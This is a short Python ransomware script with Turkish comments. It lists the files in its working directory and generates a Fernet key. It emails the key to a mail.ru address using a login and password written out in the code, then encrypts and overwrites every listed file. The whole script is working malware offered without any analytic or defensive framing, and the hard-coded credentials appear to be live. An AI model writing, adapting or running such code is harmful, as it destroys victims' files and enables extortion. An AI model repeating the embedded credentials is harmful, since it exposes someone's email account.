import os 
from cryptography.fernet import Fernet
import smtplib

# Gerekli modülleri içe aktarıyoruz.

def mail_sender(mail, password, message):
    # E-posta gönderme fonksiyonunu tanımlıyoruz.
    email_server = smtplib.SMTP('smtp.mail.ru', 587)
    email_server.starttls()  # Güvenli bağlantı başlatma
    email_server.login(mail, password)  # E-posta hesabına giriş yapma
    email_server.sendmail(mail, mail, message)  # E-posta gönderme
    email_server.quit()  # E-posta sunucusu bağlantısını kapatma

file_list = []

for file in os.listdir():
    # Mevcut dizindeki dosyaları listeleyerek dönüyoruz.
    if file == 'ransomware.py' or file == 'desktop.ini':
        continue  # Belirtilen dosyaları atlayarak geçiyoruz.
    if os.path.isfile(file):
        file_list.append(file)  # Dosyaları listeye ekliyoruz.


key = Fernet.generate_key()
# Fernet kullanarak yeni bir anahtar oluşturuyoruz.


mail_sender('rastgeletryhackme@mail.ru','AWzaqhu1iqpuHDequaEd',key)

for file in file_list:
	with open(file,'rb') as the_file:
		contents = the_file.read()
	contents_encrypt = Fernet(key).encrypt(contents)
	with open(file,'wb') as the_file:
		the_file.write(contents_encrypt)
